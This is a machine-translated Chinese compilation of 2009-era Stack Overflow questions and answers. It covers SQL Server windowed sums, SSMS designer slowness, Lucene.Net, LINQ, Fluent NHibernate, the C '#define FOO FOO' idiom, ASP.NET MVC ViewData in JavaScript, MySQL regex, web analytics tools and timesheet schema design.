只需向数据集添加一个额外的列，如下所示： ,SUM(OrderQty) OVER(PARTITION BY SalesOrderID) AS 'Total'

在上面的示例中： OrderQty 是您希望求和的值 SalerOrderID 相当于“GROUP BY”

您可以对 COUNT、AVG 等使用相同的技术

更多信息在这里 [http://msdn.microsoft.com/en-us/library/ms189461(SQL.90).aspx](http://msdn.microsoft.com/en-us/library/ms189461(SQL.90).aspx)

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2010-04-15T10:27:16.467

如果您对执行顺序有疑问，请在表格下方添加一个文本框，并在此框中显示 TotalAmount。

# menu - 原型菜单

> ID：636577
> 
> 赞同：1
> 
> 时间：2009-03-11T22:08:03.590
> 
> 标签：menu, prototypejs

有谁知道使用原型库的好的 javascript 菜单。我需要为 HTML 表格的每一行生成一个可用链接列表作为悬停/单击下拉菜单。

**约束**

*   每行的链接列表都是相同的，但是，链接需要发布该行唯一的 id 参数。
*   该表位于滚动窗格中，因此菜单需要知道是否应在必要时将自身呈现在相关 HTML 元素（例如**TD ）的另一侧以提高可见性。**

我为 JQuery 库找到了一些不错的插件，但目前不使用 JQuery，并且希望尽可能避免添加它。我已经在使用原型 1.6。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-11T22:25:22.050

下面这篇博文的作者已经使用prototype创建了一个下拉JS菜单。我认为它不适合您正在寻找的所有东西，但它应该为您提供一个起点。

[http://www.blog.highub.com/javascript/javascript-library/prototype-drop-down-menu/](http://www.blog.highub.com/javascript/javascript-library/prototype-drop-down-menu/)

# sql-server - SQL Server Management Studio 的性能问题

> ID：636578
> 
> 赞同：2
> 
> 时间：2009-03-11T22:08:19.800
> 
> 标签：sql-server, sql-server-2008, database-design, ssms

我在一台不错的机器上运行 Sql Server Management Studio 2008。即使它是唯一打开且与数据库没有其他连接的东西，与数据库图或设计器中的简单模式更改有关的任何事情都需要长达 10 分钟才能完成，并且 SQL Management Studio 在此期间没有响应。相同的**SQL 代码只需不到一秒钟的时间**。这完全违背了设计者和绘图者的目的。

```
------------------
系统信息
------------------
   操作系统：Windows Vista™ Ultimate (6.0, Build 6001) Service Pack 1 (6001.vistasp1_gdr.080917-1612)
          处理器：Intel(R) Core(TM)2 Quad CPU Q6700 @ 2.66GHz（4 个 CPU），~2.7GHz
             内存：6142MB RAM

```

请告诉我这不是 WOW64 问题；如果是的话，我喜欢 MS，但要加强对开发工具的 64 位支持。

我能做些什么来让性能接近可接受的水平吗？

编辑：我已经安装了 10.0.1600.22 版本的 SQL Server Management Studio。这不是最新版本吗？我确定我是从 MSDN CD 安装的，而且这些天我非常依赖 Windows Update。有什么地方可以让我快速查看此类工具的最新版本号是多少？

编辑：每次我打开数据库图表时，我都会收到消息“此数据库没有使用数据库图表所需的一个或多个支持对象。你想创建它们吗？” 我每次都说是的。这是问题的一部分吗？此外，如果我按下复制图标，我会收到消息“当前线程必须设置为单线程单元 (STA) 模式，然后才能进行 OLE 调用。” 数据库损坏？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-11T22:19:47.430

我在类似的环境中运行并且没有这个问题。

与任何性能问题一样，您必须对其进行一些分析 - 只是说“需要 10 分钟”并没有说明需要这么长时间的原因，因此没有任何信息可以用来解决问题。

* * *

这里有一些可以玩的工具。我最初会提到它们，但“玩耍”是我学会与它们做的所有事情。我建议您尝试了解一下它们，但我还没有这样做。[http://technet.microsoft.com](http://technet.microsoft.com)是关于性能问题的一个很好的来源。

从任务管理器开始，信不信由你。它在 Vista 和 Server 2008 中得到了增强，现在有了更好的性能选项卡和服务选项卡。请务必单击“显示所有用户的进程”，否则您会错过服务所做的令人讨厌的事情。

性能选项卡的底部有一个“资源监视器”按钮。单击它，观看它，了解它可以为您做什么。

资源监视器实际上是管理工具中更大的“可靠性和性能监视器”工具的一部分。尝试一下。它甚至包括新版本的 perfmon，当您更好地了解要查看的计数器时，它会更加有用。

我还将推荐 Sysinternals 的 Process Explorer 和 Process Monitor 工具。请参阅[http://technet.microsoft.com/en-us/sysinternals/default.aspx](http://technet.microsoft.com/en-us/sysinternals/default.aspx)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-12T11:31:26.623

您的简单架构更改是否可能意味着您正在重新排序表的列？

在这种情况下，SQL Management Studio 在幕后所做的就是创建一个新表，将旧表中的所有数据移动到新创建的表中，然后删除旧表。

因此，如果您对包含大量数据、大量索引或两者兼有的表中的列进行重新排序，您可能会在没有真正意识到的情况下进行大量“重组”工作。

马克

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-12T22:33:50.467

您可以尝试将您的 SQL Management Studio 连接到不同的 SQL Server 实例，或者更好的是，连接到远程计算机上的实例（并尝试进行类似的更改）吗？

系统或应用程序事件日志（或 SQL 日志）中是否有任何条目？您是否尝试过在您的计算机上卸载并重新安装 SQL Server？您正在运行什么版本的 SQL Server（数据库）？

最后，你能成功打开活动监视器吗？右键单击服务器（机器名称） - 在对象资源管理器窗口中的三个顶部 - 然后单击“活动监视器”。

您的机器上的其他软件有问题还是只有 SQL Server 和 Management Studio 有问题？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-12T19:09:02.847

当您打开 SSMS 时，它会尝试通过 Microsoft 验证自己。您可以通过执行以下链接中的第二个建议来加快此过程。

[http://www.sql-server-performance.com/faq/sql_server_management_studio_load_time_p1.aspx](http://www.sql-server-performance.com/faq/sql_server_management_studio_load_time_p1.aspx)

另外，您是否使用注册服务器功能？如果是这样，SSMS 将尝试验证所有这些。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-03-13T23:29:00.077

好像是网络配置问题。永远不要相信开发人员（我自己）在他的办公室设置一个随意的域。

我的计算机上的 DNS 服务器指向我的 ISP（默认是因为我们使用的 ISP 提供的无线路由器不允许我将 DNS 服务器覆盖为我自己的）而不是我的 DNS 服务器，所以我有记住在每台计算机上手动配置它，我忘记了这台特定的计算机。

当我第一次尝试从这台 PC 连接到远程 SQL Server 实例时，我才发现它。它试图解析到 mycompany.com 的实际子域，而不是我的 DNS 服务器的 COMPUTERNAME.corp.mycompany.com 权限

我不能说为什么这对 SQL Server 中的设计人员来说是个问题，但不是其他任何问题，但我唯一的假设是，当我使用计算机名称而不是“。”在本地建立到我自己的计算机的连接时。或“localhost”，SQL 查询立即执行，知道它是本地的，但设计人员在尝试本地 IP 地址之前仍然等待外部 IP 地址的超时。

不管解释是什么，将本地机器上的网卡的 DNS 服务器更改为我的 DNS 服务器的 IP，这一切都非常迅速。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2010-12-27T18:12:29.110

我的也有类似的问题。原来是对我笔记本电脑上运行的生物识别登录服务的一些干扰。禁用该服务，现在它可以工作了。

# .net - 使用 Lucene.Net 有哪些好的资源？

> ID：636579
> 
> 赞同：26
> 
> 时间：2009-03-11T22:08:30.547
> 
> 标签：.net, lucene, lucene.net

有谁知道我在哪里可以找到有关 Lucene.Net 的更多信息？

我正在寻找有关如何使用 Lucene.Net 的教程或视频，堆栈溢出用户可以亲自推荐。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2009-03-11T22:57:40.740

CodeProject 上有一些很棒的文章：

[http://www.codeproject.com/KB/library/IntroducingLucene.aspx](http://www.codeproject.com/KB/library/IntroducingLucene.aspx)
[http://www.codeproject.com/KB/aspnet/lucene-net-in-asp-net.aspx](http://www.codeproject.com/KB/aspnet/lucene-net-in-asp-net.aspx)
[http://www.codeproject。 com/KB/cs/lucene_analysis.aspx](http://www.codeproject.com/KB/cs/lucene_analysis.aspx)
[http://www.codeproject.com/KB/cs/lucene_custom_analyzer.aspx](http://www.codeproject.com/KB/cs/lucene_custom_analyzer.aspx)

如果您在他们的搜索中输入 Lucene，还有更多。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-11T22:11:29.837

我想您指的是以下内容：（[链接已替换；站点已关闭](http://incubator.apache.org/lucene.net/)）。该页面似乎包含您可能想了解的有关项目及其状态的所有信息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-11T23:07:10.423

根据您的要求，[设置 SOLR 实例](http://lucene.apache.org/solr/)也很有用。它基于 Lucene，是一个 Java Web 应用程序，提供 REST 样式的 API 用于查询和更新其内容。我们使用它在我们公司的网站上进行分面搜索；我相信 Zappos 和 NetFlix 也使用它。

# linq - 日志表的 LINQ 查询运算符

> ID：636581
> 
> 赞同：0
> 
> 时间：2009-03-11T22:08:44.260
> 
> 标签：linq

我正在尝试找到可以对审计表进行操作的 corerct LINQ to SQL 查询运算符和谓词组合。

想象一个名为 Setting 的表，它包含三列：rowID、DefID 和 Value。

我希望能够检查每个 DefID（在本例中为所有定义 1 到 3）至少有一行其值设置为 true。

LINQ 表达式应返回布尔值 true 或 false。例如，

```
RowID    DefID    Value
1        1        true
2        2        false
3        3        true 
```

LINQ 返回 false 因为 DefID = 2 没有任何值 = true

```
RowID    DefID    Value
1        1        true
2        2        false
3        2        true 
```

返回 false，因为缺少 defid 3

```
RowID    DefID    Value
1        1        true
2        1        false
3        2        true
4        3        true 
```

返回 true 因为所有定义至少有一个值 = true

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-11T22:32:00.927

下面是一个使用扩展方法的例子：

```
int[] ids = new int[] { 1, 2, 3 };

bool allFound = Settings.Where( s => s.Value && ids.Contains( s.DefID ) )
                        .Select( s => s.DefID )
                        .Distinct()
                        .Count() == ids.Length; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-11T22:29:40.247

我从来没有使用过 linq to sql，但是 linq to objects 看起来像这样：

```
defIds.All(d => d.rows.Any( row => row.Value == true ) ) 
```

要在原始 SQL 中执行此操作，我认为在一个查询中是不可能的。你可以做这样的事情：

```
select id from DefIds
join rows on row.DefId = DefIds.ID
where row.Value = true 
```

这将为您提供具有真实值的 defId 列表。在代码中，您可以执行类似的操作

```
DefIds.Select(d => d.id).ToArray() == (results from select).ToArray() 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-11T22:29:43.960

好吧，有很多有效的方法可以做到这一点。一种简单的方法是：

```
int[] DefIDs = new int[] {1, 2, 3};

bool bHasValidDefs =
    (
    from set in myDataBase.settings
    where 
        set.Value == true
        && DefIDs.Contains(set.DefID)
    select set.DefID
    ).Distinct().Count() == DefIDs.Count(); 
```

这将获取有效列表中唯一 DefID 的数量，并且至少有一个“value == true”行。然后确保这些有效 DefID 的数量等于您在上面定义的预期值。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-12T00:25:16.897

如果您可以使用 ValidSettings 或 SettingsMaster 表，您可以：

```
bool allFound = myContext.SettingsMaster.All(m=> m.Settings.Any(s=>s.Value)); 
```

对于当前的表格版本，我会

```
int[] allIds = new int[] {1, 2, 3};
var validIds = (
    from s in myContext.Settings 
    where s.Value 
    select s.DefId
    )
    .Distinct().ToList();
bool allFound = allIds.All(id => validIds.Contains(id)); 
```

# nhibernate - Fluent NHibernate HasManyToMany 和 NotFound

> ID：636594
> 
> 赞同：0
> 
> 时间：2009-03-11T22:12:51.880
> 
> 标签：nhibernate, fluent-nhibernate, nhibernate-mapping

我有以下 FNH 映射片段：

```
HasManyToMany((c) => c.Plaintiffs)
    .LazyLoad()
    .WithTableName("invoicePlantiff")
    .WithChildKeyColumn("PersonReferenceID")
    .WithParentKeyColumn("invoiceID")
    .FetchType.Join(); 
```

产生以下 HBM：

```
<bag name="Plaintiffs" access="iServe.Design.CslaNHibernate.CslaChildPropertyAccessor, iServe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" lazy="true" table="invoicePlantiff">
  <key column="invoiceID" />
  <many-to-many column="PersonReferenceID" class="iServe.PersonReference, iServe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" fetch="join" />
</bag> 
```

问题是我正在处理遗留数据，也就是说，让我们说“不太理想”，并且一些记录的 ID 无效，所以我需要将`not-found="ignore"`属性放在包内的多对多标签上。我看不出有任何方法可以用 FNH 实现这一点。

有`.NotFound.Ignore()`on the `References()`call，但没有 on the `HasManyToMany`Call。

有人能告诉我我错过了什么吗？即使在渲染后/在配置 NH 之前“注入”属性是一种技巧，我也只需要它工作即可。

提前致谢。

**更新**gcores 答案将不起作用，它会将其添加到错误的标签中，请参阅我对他的答案的评论以获取更多信息。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-03-14T23:26:22.347

我刚刚提交了一个添加`NotFound`到`HasMany`and`HasManyToMany`调用的更改。希望能帮助到你！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-11T22:28:03.603

我不确定这一点，但没有 SetAttribute 吗？

```
HasManyToMany((c) => c.Plaintiffs)
.LazyLoad()
.WithTableName("invoicePlantiff")
.WithChildKeyColumn("PersonReferenceID")
.WithParentKeyColumn("invoiceID")
.FetchType.Join()
.SetAttributte("not-found", "ignore"); 
```

**更新：**

对此感到抱歉，我知道有一个 SetAttribute 但我不确定它是否符合您的要求。

另一种选择是混合 Fluent NH 和 XML 映射，Fluent NH wiki[解释了如何做到这一点，或者可以](http://wiki.fluentnhibernate.org/show/FluentConfiguration)[从 stackoverflow](https://stackoverflow.com/questions/391101/can-you-mix-fluent-nhibernate-and-traditional-hbm-xml)中看到这个答案。

# c - 在 C 中说“#define FOO FOO”有什么意义？

> ID：636595
> 
> 赞同：15
> 
> 时间：2009-03-11T22:13:37.510
> 
> 标签：c, c-preprocessor

我遇到了一些**C**代码，其中作者到处使用以下成语：

```
typedef __int32 FOO_INT32;
#define FOO_INT32 FOO_INT32 
```

这样做有什么意义？typedef 还不够吗？对于一些不稳定的**C**编译器来说，这是一种解决方法吗？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2009-03-11T22:16:02.777

使用该`#define`指令，您将能够使用以下代码测试 typedef 是否已在代码中的其他位置完成：

```
#ifdef FOO_INT32
FOO_INT32 myfoo;
#else
int myfoo;
#endif 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-12T14:07:37.323

这是一种有时在标题中完成的做法。#define 允许对 typedef 的存在进行编译时测试。这允许如下代码：

```
#ifdef FOO_INT32
FOO_INT32 myfoo;
#else
int myfoo;
#endif 
```

或者作为一个真正的守卫#define，类似于头文件守卫。

```
#ifndef FOO_INT32
typedef int FOO_INT32
#define FOO_INT32 FOO_INT32
#endif 
```

这不一定是一个好的做法，但它有它的用途，尤其是当您有一些使用其他库定义的类型的头文件时，但您想为根本不使用这些库的情况提供自己的替代品。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2017-05-13T22:15:59.853

另一个原因是标准可能要求定义是宏。

来自 glibc 的片段`netinet/in.h`：

```
/* Standard well-defined IP protocols.  */
enum
  {
    IPPROTO_IP = 0,    /* Dummy protocol for TCP.  */
#define IPPROTO_IP      IPPROTO_IP
    IPPROTO_ICMP = 1,      /* Internet Control Message Protocol.  */
#define IPPROTO_ICMP        IPPROTO_ICMP
    IPPROTO_IGMP = 2,      /* Internet Group Management Protocol. */
#define IPPROTO_IGMP        IPPROTO_IGMP 
```

这里枚举符号也按照[相关 POSIX 规范的](http://pubs.opengroup.org/onlinepubs/000095399/basedefs/netinet/in.h.html)要求导出为宏，引用：

> 标头应定义以下宏，用作 getsockopt() 和 setsockopt() 的 level 参数的值：
> 
> IPPROTO_IP
> 
> ```
> Internet protocol. 
> ```
> 
> IPPROTO_IPV6
> 
> ```
> Internet Protocol Version 6. 
> ```
> 
> ...

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-11-14T13:10:52.827

这种模式对于微处理器中寄存器的特征检测也很有用，就像在[这个问题](https://stackoverflow.com/q/40589061/102441)中一样。比如可能有两个类似的头文件，一个定义了一个定时器，一个定义了2个：

`cheapprocessor.h`：

```
#define TMR1 TMR1
extern volatile int TMR1; 
```

`expensiveprocessor.h`：

```
#define TMR1 TMR1
extern volatile int TMR1;
#define TMR2 TMR2
extern volatile int TMR2; 
```

这意味着在您的主代码中，当您包含一个`processor.h`委托给目标的适当标头的泛型时，您可以检测功能：

```
#include <processor.h>

#ifdef TMR2
    x = TMR2;
#else
    x = 0;  // no timer, probably because we're on the cheaper model
#endif 
```

# javascript - 如何通过页面/视图上的 javascript 遍历 ViewData 中的对象？

> ID：636604
> 
> 赞同：4
> 
> 时间：2009-03-11T22:18:25.750
> 
> 标签：javascript, jquery, asp.net-mvc

首先，我对 MVC 和 jQuery 相当陌生。如果我的问题或术语不正确，我深表歉意。

我目前在我的 MVC 应用程序中有一个显示地址列表的视图。在同一页面上，我还有一张我希望在其中映射这些位置的地图。

我正在尝试找到将地址对象列表获取到视图中的 javascript 的“正确”方法，以便可以对其进行迭代和映射。

我已经看到一些解决方案需要从 javascript 代码中调用控制器的 getJSON。我希望避免这种解决方案，因为它需要再次访问数据库和网络服务器。我需要在地图上呈现地址的所有信息都已通过 ViewData 呈现给视图。

我还看到了一个解决方案，其中 javascript 可以访问通过 ViewModel.Data 传递到视图中的数据，但是这个示例处理的是单个对象，而不是列表。

如果有人有任何可用的提示或资源，我将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-03-11T22:54:06.490

只需将数据呈现到您的 javascript 中。假设您有一个地址对象列表，如下所示：

```
public class Address
{
    public string Line1 { get; set; }
    public string City { get; set; }
}

// in your controller code
ViewData["Addresses"] = new List<Address>(new Address[] { new Address() { Line1="bla", City="somewhere"}, new Address() {Line1="foo", City="somewhereelse"}}); 
```

像这样将它渲染到你的javascript中：

```
<script type="text/javascript">
var addresses = new Array(
<% for (int i = 0; i < ViewData["Addresses"].Count; i++) { %>
<%= i > 0 : "," : "" %>({line1:"<%= addr.Line1 %>", city:"<%= addr.City %>"})
<% } %>);
</script> 
```

这基本上创建了一个 JSON 格式的数组，其中包含您在 javascript 中的地址对象。

**更新：**如果您想使用框架代码自动执行此操作，而不是编写自己的代码以序列化为 JSON，请查看 JavaScriptSerializer。这是来自伟大的 ScottGu 的操作指南：[提示/技巧：使用 .NET 3.5 构建 ToJSON() 扩展方法](http://weblogs.asp.net/scottgu/archive/2007/10/01/tip-trick-building-a-tojson-extension-method-using-net-3-5.aspx)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-12T04:02:59.010

从技术上讲，ViewData 不会渲染到输出 HTMl，因此不会发送到客户端浏览器。您可以访问 ViewData 的唯一方法是将其渲染到 HTML 中的对象，例如数组或类似的东西：

```
var cityList = new Array();
function addCity(cityId, cityName) {
    var city = new Object();
    city.CityID = cityId;
    city.CityName = cityName

    cityList .push(city);
}
<% foreach (Something.DB.City item in ViewData["Cities"] as List<City>)
   { %>
   addCity(item.Id, item.Name);
<% } %> 
```

当我需要为 javascript 呈现数据时，我通常会这样做

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-11T22:46:54.340

您可以在服务器上以 JSON 格式格式化数据（作为字符串）。将此分配给您的 ViewData。然后在您的视图中，将 ViewData 分配给一个 javascript 变量。

```
<script type="text/javascrpt">
   var objList = <%= ViewData["objectListJSON"]; %>;

   for (var obj in objList)
   {
     ...
   }
</script> 
```

# javascript - 离开网页时，我可以使用什么工具来找出调用了哪些 JavaScript 事件？

> ID：636605
> 
> 赞同：2
> 
> 时间：2009-03-11T22:18:33.813
> 
> 标签：javascript, performance, browser, debugging

我有一组包含大量 JavaScript 的页面：表格排序、AJAX 调用、自动完成、动态隐藏和显示页面区域等......我看到的问题是当所述页面上的数据变大时离开页面时会注意到延迟（浏览器冻结）。当用户点击离开、关闭浏览器或执行表单提交时，就会发生这种延迟。我想看看问题是否是由 JavaScript 引起的。我可以使用什么工具来找出答案？Firebug 在这种情况下似乎不起作用。

代码库中唯一提到卸载的地方是 jquery.js 和 ui.tabs.js (jquery ui)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-11T22:30:41.210

是否附加了任何 onunload 事件处理程序（到正文、窗口、表单等）？如果是这样，这将是一个很好的调查起点。

**[编辑]：**显然 jQuery 运行一个循环，解除绑定到每个元素的所有事件。这是为了防止 IE 中的内存泄漏（由于事件处理程序关闭引用他们正在侦听的元素而创建）。如果您的 DOM 非常复杂，这可能会造成延迟。

您可以尝试在 jQuery 代码中注释掉这部分，看看是否是导致问题的原因？

**[编辑 2]：**在较新版本的 jQuery（1.3+）中，窗口卸载似乎得到了改进。你用的是什么版本？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-11T23:30:34.920

[Inline Code Finder](https://addons.mozilla.org/en-US/firefox/addon/9641)是一个 firefox 插件（嗯，实际上它是一个 firebug 插件），它可以直观地向您展示在何时何地调用了哪些事件。

# mysql - 如何从 mysql 数据库中选择列以数字开头的行？

> ID：636618
> 
> 赞同：1
> 
> 时间：2009-03-11T22:23:45.363
> 
> 标签：mysql

从一封信开始，我知道该怎么做：

```
WHERE mov_title REGEXP CONCAT('^(the )?', '$letter') 
```

如果我用任何数字替换 $letter，此方法将起作用，因此如果将其设置为 1，它将找到所有以 1 开头的记录，但我需要它适用于任何数字 0-9。我该如何修改查询？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-03-11T22:26:48.913

```
WHERE mov_title REGEXP '^(the )?[0-9]' 
```

（或者如果您想继续使用现有子句，请设置`$letter`为。）`[0-9]``WHERE`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-03-11T22:30:28.013

另一种选择可能是使用 substring 函数

```
WHERE substring( post_title, 1, 1 ) between '0' and '9' 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-11T22:43:03.960

也许 SQL 通配符 [charlist] 可能会有所帮助：

[http://w3schools.com/sql/sql_wildcards.asp](http://w3schools.com/sql/sql_wildcards.asp)

# web-analytics-tools - 还有哪些其他网络分析工具？

> ID：636625
> 
> 赞同：5
> 
> 时间：2009-03-11T22:25:33.160
> 
> 标签：web-analytics-tools

除了谷歌分析之外，人们还使用哪些其他网络分析工具？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-11T22:30:42.787

*   网络趋势
*   Webalizer (C)
*   AWStats (Perl)
*   智能统计

你想要免费的吗？其中 2 个不是，但 webalizer 很差。AStats 是体面和免费的。加上[谷歌“网络统计”](http://www.google.co.uk/search?q=website+stats)，你会得到数百个商业数据。

或打开的目录链接：

*   [日志分析](http://www.google.com/Top/Computers/Software/Internet/Site_Management/Log_Analysis/Freeware_and_Open_Source/)（免费/开源）
*   [日志分析](http://www.google.com/Top/Computers/Software/Internet/Site_Management/Log_Analysis/Commercial/)（商用）

如果你有心情完成一个项目，我通过用 C#[编写一个](http://www.codeplex.com/Statmagic)项目获得了 1/3 :) 不幸的是，最重要的部分 - 令人眼花缭乱的报告 - 从未完成。但是解析完成了。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-11T23:08:16.160

我没有任何经验，但这似乎是最“著名”的开源解决方案：

*   [Piwik](http://piwik.org/)（开源）

这些是其他商业解决方案：

*   [Woopra](http://www.woopra.com/)（测试期间免费）
*   [Clicky 网络分析](http://www.getclicky.com/)
*   [竞争](http://www.compete.com/)
*   [点击故事](http://www.clicktale.com/)

我不知道他们的使用统计。我想知道为什么有人会为这种服务付费。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-11T22:38:28.930

[薄荷](http://www.haveamint.com/)很好，很漂亮，有很多功能，而且一点也不贵。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-03-11T22:43:23.320

如果您想花费大量金钱和时间，请尝试使用 Omniture SiteCatalyst。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-09-04T21:40:52.613

如果您想要一个易于使用、实时、高性能的跟踪和报告系统，它可以让您下载所有数据（如果需要），您可以试试我的公司：

[ConversionRuler 转化跟踪](http://www.ConversionRuler.com/?_cr=comments|stackoverflow)

我们跟踪的网站每月获得 1000 万以上的页面浏览量而不会出现问题，并且有数十个代理客户使用我们的工具跟踪 30 多个客户。他们中的许多人使用我们作为 Omniture 和 WebTrends 的替代品，以节省巨额成本。

不适合所有人，但值得一看。我们专注于“少即是多”，我们不是*您可能不想向其提供数据的搜索引擎*，尤其是当您为流量付费时。（例如 Google Analytics、Urchin 和 Yahoo! Analytics）

我的 0.02 美元。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-03-11T23:17:47.917

[Reinvigorate](http://reinvigorate.net/) - 似乎他们总是在 beta 注册中。他们确实提到的一项即将推出的功能是能够查看热图报告。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-03-25T02:06:21.160

请通过指标比较查看我[对这个问题的回答。](https://stackoverflow.com/questions/16113/software-for-webserver-log-analysis)这意味着对使用 Awstats 等的警告。仅仅因为一个工具产生数字和彩色图表，并不意味着它有任何好处。

我在回答[这个问题](https://stackoverflow.com/questions/344693/looking-for-real-time-web-server-analytics-package)时发布了 Woopra 实时分析功能的屏幕截图。

# silverlight-2.0 - Silverlight MessageBox.Show 在 BackgroundWorker 中阻止 WCF 服务调用

> ID：636630
> 
> 赞同：1
> 
> 时间：2009-03-11T22:27:31.423
> 
> 标签：silverlight-2.0, messagebox

当从 Silverlight 显示 MessageBox 时，将阻止对在 BackgroundWorker 中执行的 WCF 服务的任何调用。OpenFileDialog.ShowDialog 允许这些调用通过。浏览器 (IE7) 是否在 MessageBox 期间阻止网络访问？

我们可以创建自己的模式窗口，但这会导致开发人员代码发生变化，因为它必须是异步的。（显示自定义“MessageBox”时开发人员代码不会停止）

任何想法如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-11T23:06:50.377

你能以这样的方式设计你的应用程序以避免使用模态消息框吗？也许使用弹出窗口 - 您可以通过在网格中覆盖整个应用程序并强制键盘导航在弹出窗口中循环来使它们充当模式对话框。

有关所有详细信息，请参阅[Shawn Wildermuth 的页面](http://wildermuth.com/2008/05/01/Creating_a_Pseudo-Dialog_with_Silverlight_s_Popup_Control.aspx)。

# delphi - 什么是最好的工作流工具

> ID：636649
> 
> 赞同：0
> 
> 时间：2009-03-11T22:35:55.007
> 
> 标签：delphi, winapi, workflow

首选免费、开源、vcl。对于 Delphi 2007 或更高版本和 win32。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-11T22:39:32.720

您看过[Workflow Studio](http://www.tmssoftware.com/site/workflow.asp)吗？您说您更喜欢免费和开源，但这是必需的吗？如果不是，Workflow Studio 也不会很贵（单个开发人员许可证 249 欧元，带有源代码的站点许可证 795 欧元）。

# google-app-engine - 将静态目录内容部署到谷歌应用引擎

> ID：636665
> 
> 赞同：4
> 
> 时间：2009-03-11T22:45:06.997
> 
> 标签：google-app-engine

我已经部署了我的第一个 GAE 应用程序，并且在我的主页上出现“TemplateDoesNotExist”异常。感觉我的静态目录内容没有上传到 GAE。我是否可以更新 (appcfg.py update myapp/) 我的所有文件，包括静态文件并在 myappid.appspot.com 上独立运行？

顺便在这里你可以看到问题： http: [//pollbook.appspot.com](http://pollbook.appspot.com)

PS：我的应用程序在本地运行完美

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-03-11T23:38:16.527

您的模板不应存储在您在 app.yaml 中称为“静态”的目录中。静态目录是由 CDN 提供给最终用户而无需更改的静态文件。模板引擎无法读取这些文件。它在本地工作，因为 dev_appserver 不能精确地模拟生产服务器。

将您的模板放在不同的目录中，例如 /templates 或其他目录。您无需在 app.yaml 中引用此目录。

# database - 什么是在数据库中表示时间表的最佳方式

> ID：636668
> 
> 赞同：0
> 
> 时间：2009-03-11T22:46:21.783
> 
> 标签：database, modeling

我正在尝试对时间表、计费时间、项目、用户进行建模

在数据库中表示这些的最佳方式是什么

详细说明这个问题：我最大的困境是如何将日期、时间和项目保持在一起

一种可能的解决方案

用户（PK id，名称）

项目（PK id、名称、FK user_id）

BillableHour（PK id、FK project_id、小时、日期）

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-11T23:30:01.180

从您想要的报告开始，然后向后工作。

最小输入单元是活动、持续时间，但如果你使用这个最小值，你最终会得到诸如 sri.attends.scrum.for.parisian.branch.of.client50.via.scype.from.home.to.discuss 之类的活动.installation.routine.of.zoom22，你的报告代码会有很多switch语句。

假设您将拥有至少一份报告，其中包含名称、活动描述和给定时间段的总时间。如果这是您唯一的报告，您可以将其实现为四字段列表：Worker（字符串）、Task（字符串）、Start（时间）、Duration（整数）。如果有一份报告要求提供曾经分配给特定项目的所有活动，或者一份要求所有花费在活动类型 X 上的时间，或者一份将活动分配给特定客户的报告，那么您的设计将受益于更多字段。

也许您有一份报告可以区分在家庭办公室安装.server.updates 和在战区中敌人主动炮火下安装.server.updates。如果您的时间记录屏幕上有一个“while.a.target”复选框，那么这可能会真正为您的用户节省时间。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-11T23:57:15.200

这是我的旧会计系统使用的一些表格的简短（且不完整）摘要：

*   **用户**：使用系统的人；姓名、密码等
*   **实体**：公司或企业；姓名、政府身份证等
*   **project**：可以计费的项目；名称、供应商实体、客户实体
*   **时间表**：时间表条目：用户、项目、开始时间/日期、小时数、工作描述

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-11T22:53:28.037

如果您不熟悉范式，则值得学习范式。节省您在数据库中存储冗余数据（以及其他好处）。

[http://databases.about.com/od/specificproducts/a/firstnormalform.htm](http://databases.about.com/od/specificproducts/a/firstnormalform.htm)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-03-11T23:06:21.813

我可以从一个非常高的层次告诉你我是如何在一个非常简单的计时应用程序中做到这一点的。虽然，这不一定是最好的方法。

目前我没有方便的 ER 图可以分享，但这只是一组表的一个非常基本的起点。

用户名 PK

UserRole UserID FK RoleID FK

角色 ID PK 名称

UserProject ID PK UserID FK ProjectID FK HoursAvailable

客户 ID PK 名称

项目 ID PK CustomerID FK

EntryType ID PK 名称（即计费、不可计费等）

